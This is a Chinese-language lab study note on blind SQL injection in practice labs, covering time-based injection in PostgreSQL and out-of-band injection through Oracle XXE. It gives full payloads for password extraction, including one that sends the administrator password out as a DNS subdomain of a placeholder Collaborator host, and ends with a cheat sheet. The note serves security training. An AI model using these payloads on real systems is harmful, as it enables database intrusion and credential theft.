# Day 6 · 时间盲注与带外（OAST）（3 h）

> 目标：当页面既不回显数据、也不随布尔变化、连报错都不外泄时，还剩两条路——**让查询变慢**，或者**让数据库主动连你**。
> 今天第一次用 Burp Collaborator / interactsh。节奏很慢（一次请求等 5–10 秒），但这两类技术是真实项目里"最后能打通"的兜底手段。

## 时间轴

| 时段 | 内容 | 产出 |
|------|------|------|
| 00:00–00:15 | 开 Collaborator / interactsh，验证出网 | 可用域名 |
| 00:15–00:50 | Lab 21 时间延迟 | 稳定 10 s 延迟 |
| 00:50–01:40 | Lab 22 时间盲注取密码 | 一列 response time |
| 01:40–02:20 | Lab 23 OOB 交互（Oracle） | 第一次 DNS 命中 |
| 02:20–02:55 | Lab 24 OOB 外带密码 | 子域里看到密码 |
| 02:55–03:00 | 记录延迟基线 | 阈值表 |

---

## 0. 时间盲注的三个前提

1. **查询是同步执行的**：SQL 慢 → HTTP 响应慢。异步查询（后台线程跑 SQL）用不了这招，只能走 OOB（Lab 23/24 就是这种）。
2. **你有一个稳定的延迟基线**：先测 10 次正常请求的耗时（本 lab 通常 100–300 ms），再定阈值（如 > 3 s 判真）。
3. **延迟要够大但不夸张**：1 s 会被网络抖动淹没；10 s 太慢，Intruder 跑不动。**5 s 是甜点**。

延迟语法按库：

| DBMS | 语法 |
|------|------|
| PostgreSQL | `pg_sleep(5)` / `SELECT pg_sleep(5)` |
| MySQL | `SLEEP(5)` |
| MSSQL | `WAITFOR DELAY '0:0:5'` |
| Oracle | `dbms_pipe.receive_message(('a'),5)` 或 `dbms_lock.sleep(5)` |

---

## Lab 21 · Blind SQLi with time delays（Practitioner / 35 min）

### 一句话
注入 `';SELECT pg_sleep(10)--`，响应卡 10 秒就证明注入成立（PostgreSQL，支持堆叠查询）。

### 观察
- 注入点：`Cookie: TrackingId=<随机串>`。
- 布尔/报错都没有可观测差异。
- 先测基线：正常请求约 150 ms。

### 攻击
```
TrackingId=xyz';SELECT pg_sleep(10)--
```

发出去，响应耗时 ≈ 10 s → Solved。

如果 `;` 被过滤（不能堆叠），改用拼接形式：
```
TrackingId=xyz'||(SELECT pg_sleep(10))||'
```
> 注意：`pg_sleep` 返回 `void`，用它做 `||` 拼接在部分 PG 版本会报类型错；报错就退回堆叠写法。**先试分号，再试管道。**

### 为什么有效
PostgreSQL 的 `;` 支持一次发送多条语句（stacked query），`SELECT pg_sleep(10)` 会真的让会话阻塞 10 秒。整个过程同步，所以 HTTP 响应被拖住。

### 坑
- 用 `SLEEP(10)`（MySQL 语法）→ 报 `function sleep(integer) does not exist`。报错本身就是指纹：**`pg_sleep` 存在 → PostgreSQL**。
- 别用 1 秒验证：本 lab 里 1 秒延迟和正常抖动区分度太低，容易误判。
- 有些代理/网关有 30 s 超时，10 s 是安全的；如果目标超时更短，降到 5 s。

### 带走
**"注入点存在"这件事，用时间证明最便宜。** 先花 1 个请求确认延迟，再谈取数据。

---

## Lab 22 · Blind SQLi with time delays and information retrieval（Practitioner / 45 min）

### 一句话
把"条件"塞进 `CASE`，真则 `pg_sleep(5)`，假则 `pg_sleep(0)`；用 Intruder 的 response time 列当判定列。

### 观察
同 Lab 21 的注入点，PostgreSQL。目标：`administrator` 的密码。

### 攻击

**Step 1：确认条件延迟**
```
TrackingId=xyz';SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```
→ 5 s

```
TrackingId=xyz';SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```
→ 立即返回

**Step 2：把条件换成"第 1 个字符是不是 a"**
```
TrackingId=xyz';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
```

**Step 3：Intruder**
- Sniper，payload 位置标在 `='a'` 的 `§a§`
- payload 列表：`a`–`z`、`0`–`9`
- 判定：**Response received / 耗时列**，> 4 s 的那一行命中
- 拿到第 1 位后，改 `SUBSTRING(password,1,1)` → `(2,1)`，重复

**Step 4：** 拼出完整密码 → 登录 administrator → Solved。

### 为什么有效
`CASE WHEN 条件 THEN pg_sleep(5) ELSE pg_sleep(0) END` 是一个"条件 → 时间"的编码器。数据库必须先把条件算出来才能决定睡不睡，所以延迟精确携带了 1 bit 信息。

### 坑
- `FROM users` 不能少：`SELECT CASE ... FROM users` 才能把 `username`、`password` 当列引用。
- `pg_sleep(0)` 也要写，别用 `NULL` 代替（有些版本 `CASE` 分支类型不一致会报错）。
- **并发别开高**：10 个线程各睡 5 秒，时间列会互相污染。本 lab 用 1–2 个线程最稳，或者干脆单线程脚本。
- 判定阈值取"基线 + 3 s"，不要用固定 5 s（网络抖动会漏判）。

### 带走
时间盲注的工程质量全在**判定阈值**和**并发控制**上。真实项目里我宁愿单线程跑 20 分钟，也不要多线程跑出一堆假阳性。

---

## Lab 23 · Blind SQLi with out-of-band interaction（Practitioner / 40 min）

### 一句话
查询是异步的、时间和内容都测不出来？那就让 Oracle 在解析 XML 时**主动去请求你的域名**（XXE 触发 DNS）。

### 观察
- 注入点还是 `TrackingId`。
- 布尔、报错、时间三种信号全部无差异（异步执行）。
- 数据库是 Oracle（`FROM dual` 能通）。

### 准备
- Pro：Burp → Collaborator → **Copy to clipboard** 拿一个唯一子域。
- Community：`interactsh-client` 启动后会给你一个域名，等价可用。

### 攻击
（下面这条是 **URL 编码形态**，因为靶场会把 cookie 值做 URL 解码：`+`=空格、`%3f`=`?`、`%3d`=`=`、`%25`=`%`、`%3b`=`;`、`%2f`=`/`）

```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

解码后等价于：

```sql
xyz' UNION SELECT EXTRACTVALUE(
  xmltype('<?xml version="1.0" encoding="UTF-8"?>
           <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-SUBDOMAIN/"> %remote; ]>'),
  '/l') FROM dual--
```

发一次 → Collaborator 里出现 **DNS 查询** → Solved。

### 为什么有效
三层叠加：
1. `UNION SELECT` 让注入的表达式被执行；
2. Oracle 的 `xmltype()` 会解析 XML，遇到外部实体 `%remote;` 就去**拉取那个 URL**；
3. 拉取前必须先做 DNS 解析 → 你的 Collaborator 收到查询。

所以本质上这是"用 SQL 注入点触发一次 XXE"。数据没有回来，但**"请求发生过"本身就是信息**。

### 坑
- **编码**：整条 payload 必须按 URL 编码塞进 cookie（`+` 当空格），否则 `?`、`;`、`%` 会被框架拆坏。我第一次直接把明文塞进去，服务端 400。
- XML 声明里的 `<?xml ...?>` 在 SQL 字符串里会被 `?` 干扰，所以必须 `%3f` 编码。
- `EXTRACTVALUE(...,'/l')` 的第二个参数是 XPath，随便写一个不存在的路径即可，报错不影响 DNS 已经发出。
- Community 用户注意：interactsh 的回连可能延迟几秒，别刷一次没看到就以为失败。
- 有些环境禁用了 `xmltype` 的外部实体 → 换 `UTL_HTTP.REQUEST('http://...')` 或 `UTL_INADDR.GET_HOST_ADDRESS('...')`（后者只发 DNS，最轻）。

### 带走
**OAST 是"确认漏洞存在"的终极证据。** 真实报告里，一张 Collaborator 的 DNS 命中截图，比任何"页面差异"都有说服力。

---

## Lab 24 · Blind SQLi with out-of-band data exfiltration（Practitioner / 45 min）

### 一句话
把密码拼进子域名：`http://<password>.COLLABORATOR/`。DNS 一解析，密码就出现在你的日志里——**不需要把数据"取回来"，数据自己走出来**。

### 观察
同 Lab 23 的注入点与数据库（Oracle）。目标：`administrator` 的密码。

### 攻击
在 Lab 23 的 payload 里，把固定的域名换成"密码 + 域名"的拼接：

```
TrackingId=xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
```

关键片段：

```sql
SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-SUBDOMAIN/"
```

发一次 → Collaborator 的 DNS 日志里出现：

```
<密码>.COLLABORATOR-SUBDOMAIN
```

把密码抄出来 → 登录 administrator → Solved。

### 为什么有效
DNS 查询的**域名部分由你控制**，而子域可以任意长（单标签 ≤ 63 字符）。于是数据库在解析外部实体时，把密码当成主机名的一部分去查询，等于用 DNS 当信道把数据"搬"了出来。

### 坑
- **单标签 63 字符上限**：密码超过 63 字符要截断/分段（`SUBSTR(password,1,30)`），本 lab 密码通常 20 位以内，一次够。
- 密码里如果有 `_`、`.`、`-` 之外的字符，DNS 编码可能失败——所以更稳的写法是逐字符取（回到 Lab 22 的思路），但本 lab 不需要。
- **别漏掉 `||` 两侧的引号**：这是 SQL 字符串拼接，`'||(...)||'` 才闭合得起来。少一个引号 → 500。
- Collaborator 的交互列表里要按"DNS"过滤，HTTP 那栏可能为空（只发了 DNS）。

### 带走
OOB 外带的威力在于**绕过一切"响应侧"的防御**：没有回显、没有报错、没有时间差，数据仍然能出去。真实环境里这条信道常常是唯一可行的路径，也是 WAF/出网管控的重点。

---

## 当日复盘

### 四种盲注信号的成本对照

| 技术 | 每字符请求数 | 单请求耗时 | 何时用 |
|------|-------------|-----------|--------|
| 布尔内容 | 36 | 0.1–0.3 s | 有差异 |
| 条件报错 | 36 | 0.1–0.3 s | 内容无差异、错误外泄 |
| 时间延迟 | 36 | 5–10 s | 上面都不行 |
| OOB | 1–36 | 异步 | 同步性也没有，或需要直出数据 |

### 三条"必须记住"的语法

```
PostgreSQL:  ';SELECT CASE WHEN (条件) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users--
Oracle OOB:  ' UNION SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % r SYSTEM "http://..."> %r;]>'),'/l') FROM dual--
Oracle 拼接:  http://'||(SELECT password FROM users WHERE username='administrator')||'.域名/
```

### 三个问题自测
1. 为什么 Lab 21 的 `';SELECT pg_sleep(10)--` 能生效，而 Lab 22 必须用 `CASE`？
2. Lab 23 的 payload 为什么要整体 URL 编码？哪些字符不编码就会坏？
3. Lab 24 里，如果密码有 80 个字符，你会怎么改 payload？

### 明日预告
Day 7：最后一个 lab 是 **WAF + XML 编码**（Hackvertor 的 `hex_entities`），本质是"用 XML 实体把 SQL 关键字拆成字符引用，骗过 WAF 的文本匹配"。然后做全局复盘：25 个 lab 的 bypass 矩阵、时间统计、能力自评、下一步练什么。
